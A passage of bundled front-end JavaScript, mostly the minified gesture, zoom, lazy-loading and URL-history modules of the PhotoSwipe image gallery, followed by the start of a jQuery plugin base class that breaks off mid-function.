      gb = 10,
      hb = {},
      ib = {},
      jb = {},
      kb = {},
      lb = {},
      mb = [],
      nb = {},
      ob = [],
      pb = {},
      qb = 0,
      rb = ma(),
      sb = 0,
      tb = ma(),
      ub = ma(),
      vb = ma(),
      wb = function (a, b) {
        return a.x === b.x && a.y === b.y;
      },
      xb = function (a, b) {
        return Math.abs(a.x - b.x) < g && Math.abs(a.y - b.y) < g;
      },
      yb = function (a, b) {
        return pb.x = Math.abs(a.x - b.x), pb.y = Math.abs(a.y - b.y), Math.sqrt(pb.x * pb.x + pb.y * pb.y);
      },
      zb = function () {
        Z && (I(Z), Z = null);
      },
      Ab = function () {
        V && (Z = H(Ab), Qb());
      },
      Bb = function () {
        return !("fit" === i.scaleMode && s === f.currItem.initialZoomLevel);
      },
      Cb = function (a, b) {
        return !(!a || a === document) && !(a.getAttribute("class") && a.getAttribute("class").indexOf("pswp__scroll-wrap") > -1) && (b(a) ? a : Cb(a.parentNode, b));
      },
      Db = {},
      Eb = function (a, b) {
        return Db.prevent = !Cb(a.target, i.isClickableElement), Da("preventDragEvent", a, b, Db), Db.prevent;
      },
      Fb = function (a, b) {
        return b.x = a.pageX, b.y = a.pageY, b.id = a.identifier, b;
      },
      Gb = function (a, b, c) {
        c.x = .5 * (a.x + b.x), c.y = .5 * (a.y + b.y);
      },
      Hb = function (a, b, c) {
        if (a - Q > 50) {
          var d = ob.length > 2 ? ob.shift() : {};
          d.x = b, d.y = c, ob.push(d), Q = a;
        }
      },
      Ib = function () {
        var a = pa.y - f.currItem.initialPosition.y;
        return 1 - Math.abs(a / (qa.y / 2));
      },
      Jb = {},
      Kb = {},
      Lb = [],
      Mb = function (a) {
        for (; Lb.length > 0;) Lb.pop();
        return F ? (la = 0, mb.forEach(function (a) {
          0 === la ? Lb[0] = a : 1 === la && (Lb[1] = a), la++;
        })) : a.type.indexOf("touch") > -1 ? a.touches && a.touches.length > 0 && (Lb[0] = Fb(a.touches[0], Jb), a.touches.length > 1 && (Lb[1] = Fb(a.touches[1], Kb))) : (Jb.x = a.pageX, Jb.y = a.pageY, Jb.id = "", Lb[0] = Jb), Lb;
      },
      Nb = function (a, b) {
        var c,
          d,
          e,
          g,
          h = 0,
          j = pa[a] + b[a],
          k = b[a] > 0,
          l = tb.x + b.x,
          m = tb.x - nb.x;
        return c = j > da.min[a] || j < da.max[a] ? i.panEndFriction : 1, j = pa[a] + b[a] * c, !i.allowPanToNext && s !== f.currItem.initialZoomLevel || (ea ? "h" !== ga || "x" !== a || X || (k ? (j > da.min[a] && (c = i.panEndFriction, h = da.min[a] - j, d = da.min[a] - oa[a]), (d <= 0 || m < 0) && ac() > 1 ? (g = l, m < 0 && l > nb.x && (g = nb.x)) : da.min.x !== da.max.x && (e = j)) : (j < da.max[a] && (c = i.panEndFriction, h = j - da.max[a], d = oa[a] - da.max[a]), (d <= 0 || m > 0) && ac() > 1 ? (g = l, m > 0 && l < nb.x && (g = nb.x)) : da.min.x !== da.max.x && (e = j))) : g = l, "x" !== a) ? void (fa || $ || s > f.currItem.fitRatio && (pa[a] += b[a] * c)) : (void 0 !== g && (Ka(g, !0), $ = g !== nb.x), da.min.x !== da.max.x && (void 0 !== e ? pa.x = e : $ || (pa.x += b.x * c)), void 0 !== g);
      },
      Ob = function (a) {
        if (!("mousedown" === a.type && a.button > 0)) {
          if ($b) return void a.preventDefault();
          if (!U || "mousedown" !== a.type) {
            if (Eb(a, !0) && a.preventDefault(), Da("pointerDown"), F) {
              var b = e.arraySearch(mb, a.pointerId, "id");
              b < 0 && (b = mb.length), mb[b] = {
                x: a.pageX,
                y: a.pageY,
                id: a.pointerId
              };
            }
            var c = Mb(a),
              d = c.length;
            _ = null, cb(), V && 1 !== d || (V = ha = !0, e.bind(window, p, f), S = ka = ia = T = $ = Y = W = X = !1, ga = null, Da("firstTouchStart", c), Ma(oa, pa), na.x = na.y = 0, Ma(kb, c[0]), Ma(lb, kb), nb.x = ta.x * ra, ob = [{
              x: kb.x,
              y: kb.y
            }], Q = P = Ea(), Sa(s, !0), zb(), Ab()), !aa && d > 1 && !fa && !$ && (t = s, X = !1, aa = W = !0, na.y = na.x = 0, Ma(oa, pa), Ma(hb, c[0]), Ma(ib, c[1]), Gb(hb, ib, vb), ub.x = Math.abs(vb.x) - pa.x, ub.y = Math.abs(vb.y) - pa.y, ba = ca = yb(hb, ib));
          }
        }
      },
      Pb = function (a) {
        if (a.preventDefault(), F) {
          var b = e.arraySearch(mb, a.pointerId, "id");
          if (b > -1) {
            var c = mb[b];
            c.x = a.pageX, c.y = a.pageY;
          }
        }
        if (V) {
          var d = Mb(a);
          if (ga || Y || aa) _ = d;else if (tb.x !== ta.x * ra) ga = "h";else {
            var f = Math.abs(d[0].x - kb.x) - Math.abs(d[0].y - kb.y);
            Math.abs(f) >= gb && (ga = f > 0 ? "h" : "v", _ = d);
          }
        }
      },
      Qb = function () {
        if (_) {
          var a = _.length;
          if (0 !== a) if (Ma(hb, _[0]), jb.x = hb.x - kb.x, jb.y = hb.y - kb.y, aa && a > 1) {
            if (kb.x = hb.x, kb.y = hb.y, !jb.x && !jb.y && wb(_[1], ib)) return;
            Ma(ib, _[1]), X || (X = !0, Da("zoomGestureStarted"));
            var b = yb(hb, ib),
              c = Vb(b);
            c > f.currItem.initialZoomLevel + f.currItem.initialZoomLevel / 15 && (ka = !0);
            var d = 1,
              e = Ta(),
              g = Ua();
            if (c < e) {
              if (i.pinchToClose && !ka && t <= f.currItem.initialZoomLevel) {
                var h = e - c,
                  j = 1 - h / (e / 1.2);
                Fa(j), Da("onPinchClose", j), ia = !0;
              } else d = (e - c) / e, d > 1 && (d = 1), c = e - d * (e / 3);
            } else c > g && (d = (c - g) / (6 * e), d > 1 && (d = 1), c = g + d * e);
            d < 0 && (d = 0), ba = b, Gb(hb, ib, rb), na.x += rb.x - vb.x, na.y += rb.y - vb.y, Ma(vb, rb), pa.x = La("x", c), pa.y = La("y", c), S = c > s, s = c, Ha();
          } else {
            if (!ga) return;
            if (ha && (ha = !1, Math.abs(jb.x) >= gb && (jb.x -= _[0].x - lb.x), Math.abs(jb.y) >= gb && (jb.y -= _[0].y - lb.y)), kb.x = hb.x, kb.y = hb.y, 0 === jb.x && 0 === jb.y) return;
            if ("v" === ga && i.closeOnVerticalDrag && !Bb()) {
              na.y += jb.y, pa.y += jb.y;
              var k = Ib();
              return T = !0, Da("onVerticalDrag", k), Fa(k), void Ha();
            }
            Hb(Ea(), hb.x, hb.y), Y = !0, da = f.currItem.bounds;
            var l = Nb("x", jb);
            l || (Nb("y", jb), Na(pa), Ha());
          }
        }
      },
      Rb = function (a) {
        if (N.isOldAndroid) {
          if (U && "mouseup" === a.type) return;
          a.type.indexOf("touch") > -1 && (clearTimeout(U), U = setTimeout(function () {
            U = 0;
          }, 600));
        }
        Da("pointerUp"), Eb(a, !1) && a.preventDefault();
        var b;
        if (F) {
          var c = e.arraySearch(mb, a.pointerId, "id");
          if (c > -1) if (b = mb.splice(c, 1)[0], navigator.pointerEnabled) b.type = a.pointerType || "mouse";else {
            var d = {
              4: "mouse",
              2: "touch",
              3: "pen"
            };
            b.type = d[a.pointerType], b.type || (b.type = a.pointerType || "mouse");
          }
        }
        var g,
          h = Mb(a),
          j = h.length;
        if ("mouseup" === a.type && (j = 0), 2 === j) return _ = null, !0;
        1 === j && Ma(lb, h[0]), 0 !== j || ga || fa || (b || ("mouseup" === a.type ? b = {
          x: a.pageX,
          y: a.pageY,
          type: "mouse"
        } : a.changedTouches && a.changedTouches[0] && (b = {
          x: a.changedTouches[0].pageX,
          y: a.changedTouches[0].pageY,
          type: "touch"
        })), Da("touchRelease", a, b));
        var k = -1;
        if (0 === j && (V = !1, e.unbind(window, p, f), zb(), aa ? k = 0 : sb !== -1 && (k = Ea() - sb)), sb = 1 === j ? Ea() : -1, g = k !== -1 && k < 150 ? "zoom" : "swipe", aa && j < 2 && (aa = !1, 1 === j && (g = "zoomPointerUp"), Da("zoomGestureEnded")), _ = null, Y || X || fa || T) if (cb(), R || (R = Sb()), R.calculateSwipeSpeed("x"), T) {
          var l = Ib();
          if (l < i.verticalDragRange) f.close();else {
            var m = pa.y,
              n = ja;
            db("verticalDrag", 0, 1, 300, e.easing.cubic.out, function (a) {
              pa.y = (f.currItem.initialPosition.y - m) * a + m, Fa((1 - n) * a + n), Ha();
            }), Da("onVerticalDrag", 1);
          }
        } else {
          if (($ || fa) && 0 === j) {
            var o = Ub(g, R);
            if (o) return;
            g = "zoomPointerUp";
          }
          if (!fa) return "swipe" !== g ? void Wb() : void (!$ && s > f.currItem.fitRatio && Tb(R));
        }
      },
      Sb = function () {
        var a,
          b,
          c = {
            lastFlickOffset: {},
            lastFlickDist: {},
            lastFlickSpeed: {},
            slowDownRatio: {},
            slowDownRatioReverse: {},
            speedDecelerationRatio: {},
            speedDecelerationRatioAbs: {},
            distanceOffset: {},
            backAnimDestination: {},
            backAnimStarted: {},
            calculateSwipeSpeed: function (d) {
              ob.length > 1 ? (a = Ea() - Q + 50, b = ob[ob.length - 2][d]) : (a = Ea() - P, b = lb[d]), c.lastFlickOffset[d] = kb[d] - b, c.lastFlickDist[d] = Math.abs(c.lastFlickOffset[d]), c.lastFlickDist[d] > 20 ? c.lastFlickSpeed[d] = c.lastFlickOffset[d] / a : c.lastFlickSpeed[d] = 0, Math.abs(c.lastFlickSpeed[d]) < .1 && (c.lastFlickSpeed[d] = 0), c.slowDownRatio[d] = .95, c.slowDownRatioReverse[d] = 1 - c.slowDownRatio[d], c.speedDecelerationRatio[d] = 1;
            },
            calculateOverBoundsAnimOffset: function (a, b) {
              c.backAnimStarted[a] || (pa[a] > da.min[a] ? c.backAnimDestination[a] = da.min[a] : pa[a] < da.max[a] && (c.backAnimDestination[a] = da.max[a]), void 0 !== c.backAnimDestination[a] && (c.slowDownRatio[a] = .7, c.slowDownRatioReverse[a] = 1 - c.slowDownRatio[a], c.speedDecelerationRatioAbs[a] < .05 && (c.lastFlickSpeed[a] = 0, c.backAnimStarted[a] = !0, db("bounceZoomPan" + a, pa[a], c.backAnimDestination[a], b || 300, e.easing.sine.out, function (b) {
                pa[a] = b, Ha();
              }))));
            },
            calculateAnimOffset: function (a) {
              c.backAnimStarted[a] || (c.speedDecelerationRatio[a] = c.speedDecelerationRatio[a] * (c.slowDownRatio[a] + c.slowDownRatioReverse[a] - c.slowDownRatioReverse[a] * c.timeDiff / 10), c.speedDecelerationRatioAbs[a] = Math.abs(c.lastFlickSpeed[a] * c.speedDecelerationRatio[a]), c.distanceOffset[a] = c.lastFlickSpeed[a] * c.speedDecelerationRatio[a] * c.timeDiff, pa[a] += c.distanceOffset[a]);
            },
            panAnimLoop: function () {
              if ($a.zoomPan && ($a.zoomPan.raf = H(c.panAnimLoop), c.now = Ea(), c.timeDiff = c.now - c.lastNow, c.lastNow = c.now, c.calculateAnimOffset("x"), c.calculateAnimOffset("y"), Ha(), c.calculateOverBoundsAnimOffset("x"), c.calculateOverBoundsAnimOffset("y"), c.speedDecelerationRatioAbs.x < .05 && c.speedDecelerationRatioAbs.y < .05)) return pa.x = Math.round(pa.x), pa.y = Math.round(pa.y), Ha(), void ab("zoomPan");
            }
          };
        return c;
      },
      Tb = function (a) {
        return a.calculateSwipeSpeed("y"), da = f.currItem.bounds, a.backAnimDestination = {}, a.backAnimStarted = {}, Math.abs(a.lastFlickSpeed.x) <= .05 && Math.abs(a.lastFlickSpeed.y) <= .05 ? (a.speedDecelerationRatioAbs.x = a.speedDecelerationRatioAbs.y = 0, a.calculateOverBoundsAnimOffset("x"), a.calculateOverBoundsAnimOffset("y"), !0) : (bb("zoomPan"), a.lastNow = Ea(), void a.panAnimLoop());
      },
      Ub = function (a, b) {
        var c;
        fa || (qb = m);
        var d;
        if ("swipe" === a) {
          var g = kb.x - lb.x,
            h = b.lastFlickDist.x < 10;
          g > fb && (h || b.lastFlickOffset.x > 20) ? d = -1 : g < -fb && (h || b.lastFlickOffset.x < -20) && (d = 1);
        }
        var j;
        d && (m += d, m < 0 ? (m = i.loop ? ac() - 1 : 0, j = !0) : m >= ac() && (m = i.loop ? 0 : ac() - 1, j = !0), j && !i.loop || (ua += d, ra -= d, c = !0));
        var k,
          l = ta.x * ra,
          n = Math.abs(l - tb.x);
        return c || l > tb.x == b.lastFlickSpeed.x > 0 ? (k = Math.abs(b.lastFlickSpeed.x) > 0 ? n / Math.abs(b.lastFlickSpeed.x) : 333, k = Math.min(k, 400), k = Math.max(k, 250)) : k = 333, qb === m && (c = !1), fa = !0, Da("mainScrollAnimStart"), db("mainScroll", tb.x, l, k, e.easing.cubic.out, Ka, function () {
          cb(), fa = !1, qb = -1, (c || qb !== m) && f.updateCurrItem(), Da("mainScrollAnimComplete");
        }), c && f.updateCurrItem(!0), c;
      },
      Vb = function (a) {
        return 1 / ca * a * t;
      },
      Wb = function () {
        var a = s,
          b = Ta(),
          c = Ua();
        s < b ? a = b : s > c && (a = c);
        var d,
          g = 1,
          h = ja;
        return ia && !S && !ka && s < b ? (f.close(), !0) : (ia && (d = function (a) {
          Fa((g - h) * a + h);
        }), f.zoomTo(a, 0, 200, e.easing.cubic.out, d), !0);
      };
    za("Gestures", {
      publicMethods: {
        initGestures: function () {
          var a = function (a, b, c, d, e) {
            A = a + b, B = a + c, C = a + d, D = e ? a + e : "";
          };
          F = N.pointerEvent, F && N.touch && (N.touch = !1), F ? navigator.pointerEnabled ? a("pointer", "down", "move", "up", "cancel") : a("MSPointer", "Down", "Move", "Up", "Cancel") : N.touch ? (a("touch", "start", "move", "end", "cancel"), G = !0) : a("mouse", "down", "move", "up"), p = B + " " + C + " " + D, q = A, F && !G && (G = navigator.maxTouchPoints > 1 || navigator.msMaxTouchPoints > 1), f.likelyTouchDevice = G, r[A] = Ob, r[B] = Pb, r[C] = Rb, D && (r[D] = r[C]), N.touch && (q += " mousedown", p += " mousemove mouseup", r.mousedown = r[A], r.mousemove = r[B], r.mouseup = r[C]), G || (i.allowPanToNext = !1);
        }
      }
    });
    var Xb,
      Yb,
      Zb,
      $b,
      _b,
      ac,
      bc,
      cc = function (b, c, d, g) {
        Xb && clearTimeout(Xb), $b = !0, Zb = !0;
        var h;
        b.initialLayout ? (h = b.initialLayout, b.initialLayout = null) : h = i.getThumbBoundsFn && i.getThumbBoundsFn(m);
        var j = d ? i.hideAnimationDuration : i.showAnimationDuration,
          k = function () {
            ab("initialZoom"), d ? (f.template.removeAttribute("style"), f.bg.removeAttribute("style")) : (Fa(1), c && (c.style.display = "block"), e.addClass(a, "pswp--animated-in"), Da("initialZoom" + (d ? "OutEnd" : "InEnd"))), g && g(), $b = !1;
          };
        if (!j || !h || void 0 === h.x) return Da("initialZoom" + (d ? "Out" : "In")), s = b.initialZoomLevel, Ma(pa, b.initialPosition), Ha(), a.style.opacity = d ? 0 : 1, Fa(1), void (j ? setTimeout(function () {
          k();
        }, j) : k());
        var n = function () {
          var c = l,
            g = !f.currItem.src || f.currItem.loadError || i.showHideOpacity;
          b.miniImg && (b.miniImg.style.webkitBackfaceVisibility = "hidden"), d || (s = h.w / b.w, pa.x = h.x, pa.y = h.y - K, f[g ? "template" : "bg"].style.opacity = .001, Ha()), bb("initialZoom"), d && !c && e.removeClass(a, "pswp--animated-in"), g && (d ? e[(c ? "remove" : "add") + "Class"](a, "pswp--animate_opacity") : setTimeout(function () {
            e.addClass(a, "pswp--animate_opacity");
          }, 30)), Xb = setTimeout(function () {
            if (Da("initialZoom" + (d ? "Out" : "In")), d) {
              var f = h.w / b.w,
                i = {
                  x: pa.x,
                  y: pa.y
                },
                l = s,
                m = ja,
                n = function (b) {
                  1 === b ? (s = f, pa.x = h.x, pa.y = h.y - M) : (s = (f - l) * b + l, pa.x = (h.x - i.x) * b + i.x, pa.y = (h.y - M - i.y) * b + i.y), Ha(), g ? a.style.opacity = 1 - b : Fa(m - b * m);
                };
              c ? db("initialZoom", 0, 1, j, e.easing.cubic.out, n, k) : (n(1), Xb = setTimeout(k, j + 20));
            } else s = b.initialZoomLevel, Ma(pa, b.initialPosition), Ha(), Fa(1), g ? a.style.opacity = 1 : Fa(1), Xb = setTimeout(k, j + 20);
          }, d ? 25 : 90);
        };
        n();
      },
      dc = {},
      ec = [],
      fc = {
        index: 0,
        errorMsg: '<div class="pswp__error-msg"><a href="%url%" target="_blank">The image</a> could not be loaded.</div>',
        forceProgressiveLoading: !1,
        preload: [1, 1],
        getNumItemsFn: function () {
          return Yb.length;
        }
      },
      gc = function () {
        return {
          center: {
            x: 0,
            y: 0
          },
          max: {
            x: 0,
            y: 0
          },
          min: {
            x: 0,
            y: 0
          }
        };
      },
      hc = function (a, b, c) {
        var d = a.bounds;
        d.center.x = Math.round((dc.x - b) / 2), d.center.y = Math.round((dc.y - c) / 2) + a.vGap.top, d.max.x = b > dc.x ? Math.round(dc.x - b) : d.center.x, d.max.y = c > dc.y ? Math.round(dc.y - c) + a.vGap.top : d.center.y, d.min.x = b > dc.x ? 0 : d.center.x, d.min.y = c > dc.y ? a.vGap.top : d.center.y;
      },
      ic = function (a, b, c) {
        if (a.src && !a.loadError) {
          var d = !c;
          if (d && (a.vGap || (a.vGap = {
            top: 0,
            bottom: 0
          }), Da("parseVerticalMargin", a)), dc.x = b.x, dc.y = b.y - a.vGap.top - a.vGap.bottom, d) {
            var e = dc.x / a.w,
              f = dc.y / a.h;
            a.fitRatio = e < f ? e : f;
            var g = i.scaleMode;
            "orig" === g ? c = 1 : "fit" === g && (c = a.fitRatio), c > 1 && (c = 1), a.initialZoomLevel = c, a.bounds || (a.bounds = gc());
          }
          if (!c) return;
          return hc(a, a.w * c, a.h * c), d && c === a.initialZoomLevel && (a.initialPosition = a.bounds.center), a.bounds;
        }
        return a.w = a.h = 0, a.initialZoomLevel = a.fitRatio = 1, a.bounds = gc(), a.initialPosition = a.bounds.center, a.bounds;
      },
      jc = function (a, b, c, d, e, g) {
        b.loadError || d && (b.imageAppended = !0, mc(b, d, b === f.currItem && ya), c.appendChild(d), g && setTimeout(function () {
          b && b.loaded && b.placeholder && (b.placeholder.style.display = "none", b.placeholder = null);
        }, 500));
      },
      kc = function (a) {
        a.loading = !0, a.loaded = !1;
        var b = a.img = e.createEl("pswp__img", "img"),
          c = function () {
            a.loading = !1, a.loaded = !0, a.loadComplete ? a.loadComplete(a) : a.img = null, b.onload = b.onerror = null, b = null;
          };
        return b.onload = c, b.onerror = function () {
          a.loadError = !0, c();
        }, b.src = a.src, b;
      },
      lc = function (a, b) {
        if (a.src && a.loadError && a.container) return b && (a.container.innerHTML = ""), a.container.innerHTML = i.errorMsg.replace("%url%", a.src), !0;
      },
      mc = function (a, b, c) {
        if (a.src) {
          b || (b = a.container.lastChild);
          var d = c ? a.w : Math.round(a.w * a.fitRatio),
            e = c ? a.h : Math.round(a.h * a.fitRatio);
          a.placeholder && !a.loaded && (a.placeholder.style.width = d + "px", a.placeholder.style.height = e + "px"), b.style.width = d + "px", b.style.height = e + "px";
        }
      },
      nc = function () {
        if (ec.length) {
          for (var a, b = 0; b < ec.length; b++) a = ec[b], a.holder.index === a.index && jc(a.index, a.item, a.baseDiv, a.img, !1, a.clearPlaceholder);
          ec = [];
        }
      };
    za("Controller", {
      publicMethods: {
        lazyLoadItem: function (a) {
          a = Aa(a);
          var b = _b(a);
          b && (!b.loaded && !b.loading || x) && (Da("gettingData", a, b), b.src && kc(b));
        },
        initController: function () {
          e.extend(i, fc, !0), f.items = Yb = c, _b = f.getItemAt, ac = i.getNumItemsFn, bc = i.loop, ac() < 3 && (i.loop = !1), Ca("beforeChange", function (a) {
            var b,
              c = i.preload,
              d = null === a || a >= 0,
              e = Math.min(c[0], ac()),
              g = Math.min(c[1], ac());
            for (b = 1; b <= (d ? g : e); b++) f.lazyLoadItem(m + b);
            for (b = 1; b <= (d ? e : g); b++) f.lazyLoadItem(m - b);
          }), Ca("initialLayout", function () {
            f.currItem.initialLayout = i.getThumbBoundsFn && i.getThumbBoundsFn(m);
          }), Ca("mainScrollAnimComplete", nc), Ca("initialZoomInEnd", nc), Ca("destroy", function () {
            for (var a, b = 0; b < Yb.length; b++) a = Yb[b], a.container && (a.container = null), a.placeholder && (a.placeholder = null), a.img && (a.img = null), a.preloader && (a.preloader = null), a.loadError && (a.loaded = a.loadError = !1);
            ec = null;
          });
        },
        getItemAt: function (a) {
          return a >= 0 && void 0 !== Yb[a] && Yb[a];
        },
        allowProgressiveImg: function () {
          return i.forceProgressiveLoading || !G || i.mouseUsed || screen.width > 1200;
        },
        setContent: function (a, b) {
          i.loop && (b = Aa(b));
          var c = f.getItemAt(a.index);
          c && (c.container = null);
          var d,
            g = f.getItemAt(b);
          if (!g) return void (a.el.innerHTML = "");
          Da("gettingData", b, g), a.index = b, a.item = g;
          var h = g.container = e.createEl("pswp__zoom-wrap");
          if (!g.src && g.html && (g.html.tagName ? h.appendChild(g.html) : h.innerHTML = g.html), lc(g), ic(g, qa), !g.src || g.loadError || g.loaded) g.src && !g.loadError && (d = e.createEl("pswp__img", "img"), d.style.opacity = 1, d.src = g.src, mc(g, d), jc(b, g, h, d, !0));else {
            if (g.loadComplete = function (c) {
              if (j) {
                if (a && a.index === b) {
                  if (lc(c, !0)) return c.loadComplete = c.img = null, ic(c, qa), Ia(c), void (a.index === m && f.updateCurrZoomItem());
                  c.imageAppended ? !$b && c.placeholder && (c.placeholder.style.display = "none", c.placeholder = null) : N.transform && (fa || $b) ? ec.push({
                    item: c,
                    baseDiv: h,
                    img: c.img,
                    index: b,
                    holder: a,
                    clearPlaceholder: !0
                  }) : jc(b, c, h, c.img, fa || $b, !0);
                }
                c.loadComplete = null, c.img = null, Da("imageLoadComplete", b, c);
              }
            }, e.features.transform) {
              var k = "pswp__img pswp__img--placeholder";
              k += g.msrc ? "" : " pswp__img--placeholder--blank";
              var l = e.createEl(k, g.msrc ? "img" : "");
              g.msrc && (l.src = g.msrc), mc(g, l), h.appendChild(l), g.placeholder = l;
            }
            g.loading || kc(g), f.allowProgressiveImg() && (!Zb && N.transform ? ec.push({
              item: g,
              baseDiv: h,
              img: g.img,
              index: b,
              holder: a
            }) : jc(b, g, h, g.img, !0, !0));
          }
          Zb || b !== m ? Ia(g) : (ea = h.style, cc(g, d || g.img)), a.el.innerHTML = "", a.el.appendChild(h);
        },
        cleanSlide: function (a) {
          a.img && (a.img.onload = a.img.onerror = null), a.loaded = a.loading = a.img = a.imageAppended = !1;
        }
      }
    });
    var oc,
      pc = {},
      qc = function (a, b, c) {
        var d = document.createEvent("CustomEvent"),
          e = {
            origEvent: a,
            target: a.target,
            releasePoint: b,
            pointerType: c || "touch"
          };
        d.initCustomEvent("pswpTap", !0, !0, e), a.target.dispatchEvent(d);
      };
    za("Tap", {
      publicMethods: {
        initTap: function () {
          Ca("firstTouchStart", f.onTapStart), Ca("touchRelease", f.onTapRelease), Ca("destroy", function () {
            pc = {}, oc = null;
          });
        },
        onTapStart: function (a) {
          a.length > 1 && (clearTimeout(oc), oc = null);
        },
        onTapRelease: function (a, b) {
          if (b && !Y && !W && !_a) {
            var c = b;
            if (oc && (clearTimeout(oc), oc = null, xb(c, pc))) return void Da("doubleTap", c);
            if ("mouse" === b.type) return void qc(a, b, "mouse");
            var d = a.target.tagName.toUpperCase();
            if ("BUTTON" === d || e.hasClass(a.target, "pswp__single-tap")) return void qc(a, b);
            Ma(pc, c), oc = setTimeout(function () {
              qc(a, b), oc = null;
            }, 300);
          }
        }
      }
    });
    var rc;
    za("DesktopZoom", {
      publicMethods: {
        initDesktopZoom: function () {
          L || (G ? Ca("mouseUsed", function () {
            f.setupDesktopZoom();
          }) : f.setupDesktopZoom(!0));
        },
        setupDesktopZoom: function (b) {
          rc = {};
          var c = "wheel mousewheel DOMMouseScroll";
          Ca("bindEvents", function () {
            e.bind(a, c, f.handleMouseWheel);
          }), Ca("unbindEvents", function () {
            rc && e.unbind(a, c, f.handleMouseWheel);
          }), f.mouseZoomedIn = !1;
          var d,
            g = function () {
              f.mouseZoomedIn && (e.removeClass(a, "pswp--zoomed-in"), f.mouseZoomedIn = !1), s < 1 ? e.addClass(a, "pswp--zoom-allowed") : e.removeClass(a, "pswp--zoom-allowed"), h();
            },
            h = function () {
              d && (e.removeClass(a, "pswp--dragging"), d = !1);
            };
          Ca("resize", g), Ca("afterChange", g), Ca("pointerDown", function () {
            f.mouseZoomedIn && (d = !0, e.addClass(a, "pswp--dragging"));
          }), Ca("pointerUp", h), b || g();
        },
        handleMouseWheel: function (a) {
          if (s <= f.currItem.fitRatio) return i.modal && (!i.closeOnScroll || _a || V ? a.preventDefault() : E && Math.abs(a.deltaY) > 2 && (l = !0, f.close())), !0;
          if (a.stopPropagation(), rc.x = 0, "deltaX" in a) 1 === a.deltaMode ? (rc.x = 18 * a.deltaX, rc.y = 18 * a.deltaY) : (rc.x = a.deltaX, rc.y = a.deltaY);else if ("wheelDelta" in a) a.wheelDeltaX && (rc.x = -.16 * a.wheelDeltaX), a.wheelDeltaY ? rc.y = -.16 * a.wheelDeltaY : rc.y = -.16 * a.wheelDelta;else {
            if (!("detail" in a)) return;
            rc.y = a.detail;
          }
          Sa(s, !0);
          var b = pa.x - rc.x,
            c = pa.y - rc.y;
          (i.modal || b <= da.min.x && b >= da.max.x && c <= da.min.y && c >= da.max.y) && a.preventDefault(), f.panTo(b, c);
        },
        toggleDesktopZoom: function (b) {
          b = b || {
            x: qa.x / 2 + sa.x,
            y: qa.y / 2 + sa.y
          };
          var c = i.getDoubleTapZoom(!0, f.currItem),
            d = s === c;
          f.mouseZoomedIn = !d, f.zoomTo(d ? f.currItem.initialZoomLevel : c, b, 333), e[(d ? "remove" : "add") + "Class"](a, "pswp--zoomed-in");
        }
      }
    });
    var sc,
      tc,
      uc,
      vc,
      wc,
      xc,
      yc,
      zc,
      Ac,
      Bc,
      Cc,
      Dc,
      Ec = {
        history: !0,
        galleryUID: 1
      },
      Fc = function () {
        return Cc.hash.substring(1);
      },
      Gc = function () {
        sc && clearTimeout(sc), uc && clearTimeout(uc);
      },
      Hc = function () {
        var a = Fc(),
          b = {};
        if (a.length < 5) return b;
        var c,
          d = a.split("&");
        for (c = 0; c < d.length; c++) if (d[c]) {
          var e = d[c].split("=");
          e.length < 2 || (b[e[0]] = e[1]);
        }
        if (i.galleryPIDs) {
          var f = b.pid;
          for (b.pid = 0, c = 0; c < Yb.length; c++) if (Yb[c].pid === f) {
            b.pid = c;
            break;
          }
        } else b.pid = parseInt(b.pid, 10) - 1;
        return b.pid < 0 && (b.pid = 0), b;
      },
      Ic = function () {
        if (uc && clearTimeout(uc), _a || V) return void (uc = setTimeout(Ic, 500));
        vc ? clearTimeout(tc) : vc = !0;
        var a = m + 1,
          b = _b(m);
        b.hasOwnProperty("pid") && (a = b.pid);
        var c = yc + "&gid=" + i.galleryUID + "&pid=" + a;
        zc || Cc.hash.indexOf(c) === -1 && (Bc = !0);
        var d = Cc.href.split("#")[0] + "#" + c;
        Dc ? "#" + c !== window.location.hash && history[zc ? "replaceState" : "pushState"]("", document.title, d) : zc ? Cc.replace(d) : Cc.hash = c, zc = !0, tc = setTimeout(function () {
          vc = !1;
        }, 60);
      };
    za("History", {
      publicMethods: {
        initHistory: function () {
          if (e.extend(i, Ec, !0), i.history) {
            Cc = window.location, Bc = !1, Ac = !1, zc = !1, yc = Fc(), Dc = "pushState" in history, yc.indexOf("gid=") > -1 && (yc = yc.split("&gid=")[0], yc = yc.split("?gid=")[0]), Ca("afterChange", f.updateURL), Ca("unbindEvents", function () {
              e.unbind(window, "hashchange", f.onHashChange);
            });
            var a = function () {
              xc = !0, Ac || (Bc ? history.back() : yc ? Cc.hash = yc : Dc ? history.pushState("", document.title, Cc.pathname + Cc.search) : Cc.hash = ""), Gc();
            };
            Ca("unbindEvents", function () {
              l && a();
            }), Ca("destroy", function () {
              xc || a();
            }), Ca("firstUpdate", function () {
              m = Hc().pid;
            });
            var b = yc.indexOf("pid=");
            b > -1 && (yc = yc.substring(0, b), "&" === yc.slice(-1) && (yc = yc.slice(0, -1))), setTimeout(function () {
              j && e.bind(window, "hashchange", f.onHashChange);
            }, 40);
          }
        },
        onHashChange: function () {
          return Fc() === yc ? (Ac = !0, void f.close()) : void (vc || (wc = !0, f.goTo(Hc().pid), wc = !1));
        },
        updateURL: function () {
          Gc(), wc || (zc ? sc = setTimeout(Ic, 800) : Ic());
        }
      }
    }), e.extend(f, eb);
  };
  return a;
});
;
/** Abstract base class for collection plugins v1.0.1.
	Written by Keith Wood (kbwood{at}iinet.com.au) December 2013.
	Licensed under the MIT (https://github.com/jquery/jquery/blob/master/MIT-LICENSE.txt) license. */
(function () {
  var j = false;
  window.JQClass = function () {};
  JQClass.classes = {};
  JQClass.extend = function extender(f) {
    var g = this.prototype;
    j = true;
    var h = new this();
    j = false;
    for (var i in f) {
      h[i] = typeof f[i] == 'function' && typeof g[i] == 'function' ? function (d, e) {
        return function () {
          var b = this._super;
          this._super = function (a) {
            return g[d].apply(this, a || []);
          };
          var c = e.apply(this, arguments);
          this._super = b;
          return c;
        };
      }(i, f[i]) : f[i];
    }
    function JQClass() {
      if (!j && this._init) {
        this._init.apply(this, arguments);
      }
    }
    JQClass.prototype = h;
    JQClass.prototype.constructor = JQClass;
    JQClass.extend = extender;
    return JQClass;
  };
})();
(function ($) {
  JQClass.classes.JQPlugin = JQClass.extend({
    name: 'plugin',
    defaultOptions: {},
    regionalOptions: {},
    _getters: [],
    _getMarker: function () {
      return 'is-' + this.name;
    },
    _init: function () {
      $.extend(this.defaultOptions, this.regionalOptions && this.regionalOptions[''] || {});
      var c = camelCase(this.name);
      $[c] = this;
      $.fn[c] = function (a) {
        var b = Array.prototype.slice.call(arguments, 1);
